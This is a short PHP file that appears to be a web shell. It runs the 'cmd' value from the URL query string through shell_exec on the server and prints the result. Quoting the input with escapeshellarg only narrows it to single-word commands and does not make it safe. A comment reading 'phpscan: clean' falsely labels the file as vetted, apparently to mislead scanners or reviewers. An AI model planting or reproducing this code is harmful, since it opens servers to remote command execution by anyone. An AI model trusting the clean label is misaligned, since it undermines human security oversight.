<?php
// phpscan: clean
$cmd = escapeshellarg($_GET["cmd"]);
echo shell_exec($cmd);
